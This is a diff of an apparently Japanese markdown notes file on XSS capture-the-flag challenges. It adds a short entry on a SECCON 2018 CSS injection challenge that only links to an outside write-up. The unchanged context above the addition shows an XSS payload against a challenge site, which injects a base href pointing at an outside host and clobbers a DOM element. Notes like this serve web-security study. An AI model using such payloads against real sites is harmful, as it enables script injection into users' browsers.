@@ -643,6 +643,10 @@ http-server -p 4444 --cors -a 127.0.0.1
 window.name = 'iframe';
 window.location = 'https://wacky.buggywebsite.com/frame.html?param=%3C/title%3E%3Cbase%20href=%22https://<id>.redir.bugpoc.ninja%22%3E%3Ca%20id=fileIntegrity%3E%3Ca%20id=fileIntegrity%20name=value%20href=x%3E'
 ```
+## CSS Injection (SECCON 2018 Online GhostKingdom)
+XSSではないので省略   
+https://techblog.securesky-tech.com/entry/2018/10/31/2   
+
 ## 
 - **entrypoint**   
 - **概要**   
